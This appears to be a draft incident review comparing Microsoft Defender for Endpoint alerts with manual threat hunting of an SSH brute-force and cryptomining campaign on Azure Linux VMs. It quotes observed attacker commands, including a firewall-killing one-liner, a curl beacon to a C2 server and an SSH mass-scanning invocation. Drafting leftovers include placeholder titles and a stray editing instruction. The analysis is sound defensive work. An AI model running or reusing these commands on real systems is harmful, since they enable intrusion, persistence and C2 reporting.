# MDE Dashboard Review

This file summarizes alerts, incidents, and automated detections surfaced by Microsoft Defender for Endpoint (MDE) during the SSH brute-force campaign observed in March–April 2025.

The objective is to assess MDE’s automated coverage and correlate it with findings from manual threat hunting documented in `initial-threat-hunt.md`.

---

## Incidents Timeline

| Date & Time (UTC)     | Incident Title                                                   | Affected Device                                |
|-----------------------|------------------------------------------------------------------|------------------------------------------------|
| February 17, 2025     | Unusual SSH authentication behavior                             | Linux-VulnMgmt-Kobe                            |
| February 18–20, 2025  | Lateral movement and brute-force attempts across tenant          | Multiple Azure VMs                             |
| March 17, 2025 15:36  | Possible SSH brute-force attack                                  | sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd       |
| March 18, 2025        | Connection to malicious domain (dinpasiune.com)                  | jr-linux-vm-test                               |
| March 18–April 3, 2025| Sustained brute-force & mining activity                          | linuxvmcraig, linux-vulnerability-test-dylan   |

---

## Alert Storyline and Timeline of Detection

### February 17, 2025 — Initial Indicator of Compromise

**Device Involved:** `Linux-VulnMgmt-Kobe`  
**Time:** 8:37 PM  
**Activity:** Multiple failed SSH logon attempts followed by a successful brute-force login attempt from a Microsoft Azure IP.

**Note:** *The user had intentionally exposed the device to internet-facing SSH access. The SSH daemon was started, and after numerous failed logon attempts, a successful connection was made from IP `20.80.241.91` — a Microsoft Azure cloud address not inherently malicious. Malicious behavior was observed immediately after this connection, marking the initial indicator of compromise.*

<p align="center">
  <img src="https://github.com/user-attachments/assets/9d1387fd-0dfe-47ed-b662-f961fc7cc5ab" alt="Screenshot description" width="500"/>
  <img src="https://github.com/user-attachments/assets/cac9b34b-0d24-4e30-aeb5-9cc31a8d8bd1" alt="Screenshot description" width="500"/>
</p>

**Observed Command:**

```bash
-c "pkill firewalld  -9;pkill iptables -9;ulimit -e 999999;... rm -rf .bash_history; history -c
```
[View full command → `observed-commands.md`](./observed-commands.md#bisis-ssh-brute-force-command)

**Command Breakdown:**
- Disables local firewall protections by terminating `firewalld` and `iptables`
- Increases system resource limits with `ulimit`
- Downloads and executes multiple payloads from `194.32.145.243` using `wget`, `curl`, and `tftp`
- Cleans execution traces by deleting shell history and temporary files

<p align="center">
  <img src="https://github.com/user-attachments/assets/09a6b57f-0c77-49c0-b4fd-a39ba10e0a95" alt="Screenshot description" width="525"/>
  <img src="https://github.com/user-attachments/assets/c7ed4c85-88ff-4c10-bcb9-3c6356c5a814" alt="Screenshot description" width="475"/>
  <img src="https://github.com/user-attachments/assets/b00a6d04-c1cc-4442-af3a-4e373333d025" alt="Screenshot description" width="600"/>
</p>

**File Activity:** Execution of `logsbins.sh` triggered creation of multiple files named sequentially from `b` to `o`. Each of these files is distinct and has been flagged as malicious.

**Malware Association:** These alphabetically named files are linked to the **Gafgyt** botnet, commonly used to conscript infected systems into coordinated botnet operations.

**VirusTotal Scores:**
- IP `194.32.145.243`: `12/94`
- File `b`: `44/64` (add link to virustotal-summary)

---

### February 18-19, 2025 — Lateral Movement and Persistence Activity

#### February 18, 2025

**Devices Involved:**  
- `Linux-VulnMgmt-Kobe`  
- `linux-ubuntu-lab`  
- `ed-linux`

**Activity:**  
The device `Linux-VulnMgmt-Kobe` (IP `10.0.0.160`) began making repeated login attempts to other virtual machines within the tenant network. This activity triggered detection alerts for an **unusual number of failed sign-in attempts**.

**Screenshot Context:**
<p align="center">
  <img src="https://github.com/user-attachments/assets/6e52e8a7-ea19-4d40-b56d-566a20b9dc29" alt="Login Attempts Timeline" width="250"/>
  <img src="https://github.com/user-attachments/assets/22ac491f-e4fe-44db-9e88-f6e52e72d229" alt="Failed SSH Attempts on VM" width="400"/>
</p>
<p align="center">
  <img src="https://github.com/user-attachments/assets/316a6aef-1dfd-431e-84ed-8d8f0bf029c9" alt="Expanded Device Activity" width="700"/>
  <img src="https://github.com/user-attachments/assets/dc5d668b-7ec7-4192-8f5c-71211caca724" alt="Detailed SSH Activity" width="700"/>
</p>

**Behavior Observed:**  
- Device `Linux-VulnMgmt-Kobe` initiated multiple SSH brute-force attempts within the Azure tenant.
- The failed sign-in attempts suggest the attacker was systematically probing for weak SSH credentials.

---

**The compromise of the `Linux-VulnMgmt-Kobe` device on February 18 set the stage for subsequent lateral movement throughout the Azure tenant environment. Attackers leveraged the initial breach to pivot across the network, targeting additional virtual machines in the tenant infrastructure. This activity marked the start of a broader campaign of internal reconnaissance and credential harvesting aimed at expanding their foothold.**

---

#### February 19, 2025

**Device Involved:**  
- `Linuz-scan-agent`

**Activity:**  
The device `Linuz-scan-agent`  was subjected to a similar pattern of brute-force attempts.  After numerous failed logon attempts, an attacker successfully gained access. Subsequently, the device began using the `cron` service to schedule execution of a file named `VwIEbFMroMSrleiJ`.

**File Details:**  
The file `VwIEbFMroMSrleiJ` shares the same obfuscated naming style as `UpzBUBnv` observed in previous threat-hunt findings (`initial-threat-hunt.md`).

**Screenshot Context:**
<p align="center">
  <img src="https://github.com/user-attachments/assets/3e4963e2-b321-4034-b902-e7eb4386d9fe" alt="Cron Execution Evidence" width="350"/>
  <img src="https://github.com/user-attachments/assets/d904a958-88d6-45ca-ad35-9178bfeb5487" alt="File Ingress Events" width="750"/>
</p>

**Additional Context:**  
Subsequent research confirmed that `VwIEbFMroMSrleiJ` is an ELF file associated with the **Gafgyt botnet**. It was scheduled via `cron` to execute every minute for a 1-minute interval, suggesting automated persistence and a potential for repeated malicious activity.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/fa2da0dc-a09d-4898-9ee9-2949eb4f594f" alt="Detailed Process Timeline" width="700"/>
</p>

**VirusTotal Scores:**
- File `VwIEbFMroMSrleiJ`: **14/64**

---

#### February 20, 2025 - *Need Title*

Feb 20

**Device Involved:**
- `Levi-Linux-Vulnerability`
- `Linux-Vuln-Test-Jonz`

**Activity:**
The `Levi` compromised device showed activity of a file ingress `YAvdMwRw` from the IP address `128.199.194.30`. This file is considered to be a malicious trojan file called multiverze from the frtizfrog family (a well known trojan malware). IT targets Linux systems by breaking into them through SSH. Once inside, it spreads to other machines using a peer-to-peer (P2P) network and this is how the VMs are being infected in our azure tenant as the malware is spreading laterally to other devices.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/00469dee-993a-4b76-b3f1-7407a12a766c" alt="Detailed Process Timeline" width="700"/>
</p>

**Subsequent Activity:**
Once the file `YAvdMwRw` is executed once in the system, 2 other files are created-`retea` and `Update`. (these are two familiar files we've seen in the previous initial-threat-hunt.md analysis)

<p align="center">  
  <img src="https://github.com/user-attachments/assets/a2fa0fb0-e5ac-46d8-ba73-4c4b7b9b48fb" alt="Detailed Process Timeline" width="800"/>
  <img src="https://github.com/user-attachments/assets/e3f3e114-4f26-4ef2-9e99-542552d52da9" alt="Detailed Process Timeline" width="800"/>
</p>

**Malicious Scripts Observered Again:**
We can observe the same bash script we analyzed in the `initial-threat-hunt` that executes `retea` and `network`. Subsequently, `kuak` and `diicot` are created. 

Put this in 1 sentence: Terminates known miner processes to stop existing cryptomining activity (e.g., xmrig, cnrig, Opera)
Disables scehduled tasks and removes SSH authorized keys and command history
Downloads and silently executes a remote payload (payload) from dinpasiune.com
Executes second hidden binary .teaca, subsequently clearing logs
Alters system limits (ulimit, /etc/sysctl.conf) and prepares /dev/shm for staging and persistence
Credential harvesting done by enumerating local users and generating a large password dictionary (pass) using common variations
./network loader script is executed, as detailed in the previous finding
Performs a final round of log and history deletion

**More Activity**
Minutes later we see the creation of the file `Update`, we’ve established this file is executed to maintain the persistence aspect of the brute-force attack. We also see the `Update` file creating a `cache` file from it. `cache` is used to avoid detection of any suspicious behaviour.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/dc9c1b26-4a05-4dde-8f13-46d825babc43" alt="Detailed Process Timeline" width="800"/>
  <img src="https://github.com/user-attachments/assets/153793e0-53f0-4a85-850a-17d1dd9472fe" alt="Detailed Process Timeline" width="800"/>
</p>

**VirusTotal Scores:**
- IP `128.199.194.30`: **8/94**
- File `YAvdMwRw`: **34/64**
- `retea`: **23/64**
- `Update`: **27/63**

---

#### March 4 and 7, 2025 - *Need Title*

March 4

**Device Involved:**
- `Linux-Program-Fix`

**Activity:**
A file ingress from IP address `170.64.230.111` via SCP was initiated, a file under the name of `cache` was written to the `/tmp` directory

<p align="center">  
  <img src="https://github.com/user-attachments/assets/d243bb56-63b2-4d7f-81c4-fb029943f9ba" alt="Detailed Process Timeline" width="700"/>
</p>

**Subsequent Activity:**
Concurrently of the `cache` file drop, an additional file `MNFlEGNm` was introduced and executed. WE can see the resemblence of the file name with previous files encountered such as `UpzBUBnv` in our initital analysis.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/14996335-df77-4ee9-bbba-8bc6ec6198b5" alt="Detailed Process Timeline" width="800"/>
</p>

**Malicious Scripts Observered Again:**
Shortly after the execution of both `cache` and `MNFlEGNm`, hidden process named `.b` was launched. the `.b` binary has been observed in conjunction with scheduled `cron` jobs, indicating a potential persistence mechanism.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/55ac6de8-403f-42d6-b11f-b8035455a84f" alt="Detailed Process Timeline" width="800"/>
</p>


March 7

**Device Involved:**
- `linux-programatic-ajs`

**Activity:**
Similar file ingress from IP address `196.251.88.103` via SCP created a file `cache` which was exwritten to the `/tmp` directory

<p align="center">  
  <img src="https://github.com/user-attachments/assets/6beead87-7cfc-4c3b-8bcf-5010a5f06bc9" alt="Detailed Process Timeline" width="700"/>
</p>

**Subsequent Activity:**
File `AqsEUmKy` appeared—its naming convention closely aligns with previously observed files such as "MNFlEGNm" and "UpzBUBnv", suggesting a likely common origin and functionality. Concurrently, a hidden script named History was made executable and executed within the same /tmp/.update-logs directory. followed by the execution of an Update file from the same location potentially facilitating persistence or further payload execution tied to the cache and AqsEUmKy files

<p align="center">  
  <img src="https://github.com/user-attachments/assets/60a1fa32-8ccd-421b-9176-89533271eb84" alt="Detailed Process Timeline" width="700"/>
</p>

**More Activity:**
file named `.bisis` was created and was tagged as PUA.Portscan commonly used for network reconnaissance or scanning for vulnerable services

<p align="center">  
  <img src="https://github.com/user-attachments/assets/2be455e3-a82d-4876-91b2-639c5ffcf726" alt="Detailed Process Timeline" width="700"/>
</p>

**VirusTotal Scores:**
- `cache`: ****
- `MNFlEGNm`: **N/A**
- `AqsEUmKy`: **N/A**
- `170.64.230.111`: **3/94**
- `196.251.88.103`: ****
- `.bisis`: ****

---

#### March 8 2025 - *Need Title*

**Device Involved:**
- `linux-programatic-ajs`

**Activity:**
The same `linux-programatic-ajs` device displayed suspsicious activity with a command that silently sends a device's IP address to a remote server (`196.251.73.38:47`) via a crafted HTTP request using `curl`. It disguises the traffic as a legitimate browser request by adding typical headers. The use of --insecure bypasses SSL certificate validation, and the activity likely functions as a beacon — reporting the infected system’s presence back to a command-and-control (C2) server. It used IP `103.108.140.172` as the parameters. As you can see the `Update` file created and executed this curl script.

```kql
curl --silent "http://196.251.73.38:47/save-data?IP=103.108.140.172" 
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
  -H "Accept-Language: en-US,en;q=0.9" 
  -H "Cache-Control: max-age=0" 
  -H "Connection: keep-alive" 
  -H "Upgrade-Insecure-Requests: 1" 
  --insecure
```

<p align="center">  
  <img src="https://github.com/user-attachments/assets/f780335a-18a6-4043-863c-23c756c3439b" alt="Detailed Process Timeline" width="700"/>
</p>

**VirusTotal Scores:**
- `Update`: ****
- `196.251.73.38:47`: **N/A**
- `103.108.140.172`: **N/A**

---

#### March 14 - 17 2025 - *Need Title*

March 14

**Device Involved:**
- `sakel-linux-2`

**Activity:**
Hidden script `History` was executed which triggered `Update` file to be within the same `.update-logs` directory to be ran. From the `Update` file running, both `.bisis` and `cache` were created. Proceeding was the execution of the `cache` file

<p align="center">  
  <img src="https://github.com/user-attachments/assets/c4f416f2-61a5-4ee8-9302-1fc3f039cf9d" alt="Detailed Process Timeline" width="700"/>
  <img src="https://github.com/user-attachments/assets/24e63de5-8840-429c-b10c-9f119c1415cc" alt="Detailed Process Timeline" width="700"/>
</p>

**Additional Activity:**
`cron` job initiated a background script `.b` that silently runs from the temp directory attempting to avoid detection. the `.b` directly. `cache` file dropped and launched again after the `.b` execution

<p align="center">  
  <img src="https://github.com/user-attachments/assets/1437548a-13c6-4bcd-92ba-fb7275099c7b" alt="Detailed Process Timeline" width="700"/>
</p>

**More Activity:**
`Update` file is executed and then there is a curl command that silently sends an HTTP `GET` request to `http://196.251.73.38:47/save-data`, including an IP address (`45.64.186.20`) as a query parameter.

<p align="center">  
  <img src="https://github.com/user-attachments/assets/3c089219-b09e-4c85-a080-a0782ca36cca" width="700"/>
</p>

March 17

**Activity:**
`Update` file is silently ran exactly like the `.b` file from activity that occurred on the 14th

<p align="center">  
  <img src="https://github.com/user-attachments/assets/6756dbbe-9f5d-4b97-9475-cc4cf4850e6c" width="700"/>
</p>

**Following Activity:**
Bash command runs and a hidden executable `.bisis` that takes a list of IPs and tries to connect to them via SSH without authentication, using settings from a config file (`data.json`). It also increases system limits to handle many simultaneous connections and then runs another script (`x`) afterward.

```kql
bash -c "
cd /var/tmp/.update-logs
chmod +x /var/tmp/.update-logs/.bisis
ulimit -n 999999
cat /var/tmp/.update-logs/iplist | /var/tmp/.update-logs/./.bisis ssh -o /var/tmp/.update-logs/data.json --userauth none --timeout 8
/var/tmp/.update-logs/x
"
```

```kql
/var/tmp/.update-logs/./.bisis ssh \
  -o /var/tmp/.update-logs/data.json \
  --userauth none \
  --timeout 8
```


<p align="center">  
  <img src="https://github.com/user-attachments/assets/116d0f50-47d0-419d-a6f6-d110963ebca0" width="700"/>
</p>





**VirusTotal Scores:**
- `History`: ****
- `Update`: **N/A**
- `.bisis`: **N/A**
- `cache`: **N/A**
- `.b`: **N/A**
- `196.251.73.38:47`: **N/A**













































































### February 20, 2025 — Lateral Movement Begins

Still without MDE alerts, malware on `Levi-Linux-Vulnerability` initiated peer-to-peer propagation using the FritzFrog (Multiverse) trojan family. Scripts named `retea`, `Update`, and `network` were executed, deploying mining payloads and persistence mechanisms. Files such as `diicot`, `kuak`, and `cache` were dropped.

> ❗ MDE failed to detect or surface alerts for this lateral movement or file ingress. Infection paths were only uncovered through KQL-based manual threat hunting.

---

### March 17, 2025 — First Automated Detection

**Alert**: *Possible SSH brute-force attack*  
**Device**: sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net  
**Timestamp**: March 17, 2025 @ 15:36 UTC  

**Summary**:  
MDE finally raised an alert for brute-force behavior after over **85,000** outbound SSH connection attempts were made using the `.bisis` executable. However, manual hunting had previously confirmed this behavior began on **March 14**, meaning this was a **delayed detection**.  

<p align="center"> <img src="<!-- Screenshot: SSH brute-force alert from MDE dashboard -->" alt="SSH brute-force alert in MDE" width="800"/> </p>

> 🔁 Correlates directly with findings in `initial-threat-hunt.md` under the section covering `.bisis` command behavior.

---

### March 18, 2025 — Outbound C2 Alert

**Alert**: *Connection to known malicious domain*  
**Device**: jr-linux-vm-test.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net  
**Timestamp**: March 18, 2025 (Time unspecified)  

**Summary**:  
MDE flagged a connection to the domain `dinpasiune.com`, which had a VirusTotal score of 12/94. This domain was referenced in the `./retea` and `./network` scripts used to fetch additional payloads. The alert correctly identified the C2 beaconing attempt but did **not flag the scripts**, such as `retea`, or the downloaded file `cache`.

<p align="center"> <img src="<!-- Screenshot: C2 domain alert in MDE -->" alt="C2 alert in MDE" width="800"/> </p>

> 🔁 This aligns with the manual discovery of beaconing behavior using `curl` commands found in the Update script chain.

---

### March 18–April 3, 2025 — Persistence and Propagation

No additional alerts were generated by MDE for:
- Execution of malicious files such as `UpzBUBnv`, `kuak`, or `diicot`
- Scheduled cron jobs for `.b` or `Update`
- SSH inbound connections from suspicious IPs (e.g., `65.49.1.121`, score: 9/94)

Devices including `linuxvmcraig` and `linux-vulnerability-test-dylan` continued to exhibit brute-force behavior and payload execution patterns similar to those previously documented, but **MDE surfaced no alerts for these hosts**.

> ❗ Indicates a lack of telemetry-based correlation across hosts despite reused scripts, file names, and infrastructure.

---

## Gaps and Observations

### 🔍 Strengths
- MDE successfully detected:
  - High-volume SSH brute-force activity once a threshold was reached (March 17 alert)
  - Connections to known malicious domains (e.g., `dinpasiune.com`)
- Correlation between network behavior and some known C2 infrastructure was effective.

### 🚨 Gaps
- **Delayed detection**: Brute-force attempts began March 14; MDE only triggered alerts on March 17.
- **Missed early-stage persistence**: Initial execution of `Update`, `.b`, and `History` was not flagged.
- **Limited visibility into lateral movement**: Even with similar behaviors across five VMs, MDE only surfaced alerts on two.
- **No behavioral alerting on ELF-based mining payloads**: Despite multiple VirusTotal-flagged binaries (e.g., `kuak` scored 31/64), no execution-level alerts were generated.
- **Script-based attacks flew under radar**: Custom cron jobs, obfuscated bash payloads, and curl-based exfiltration were not surfaced.

### 🧭 Manual Correlation Gained Visibility
The threat-hunting methodology outlined in `initial-threat-hunt.md` revealed:
- Early infection vectors  
- The full lifecycle of deployed payloads  
- Coordinated lateral movement  
- Reused persistence tactics across multiple hosts

> Without this, the majority of Diicot’s activity would have gone undetected by MDE alone.

---


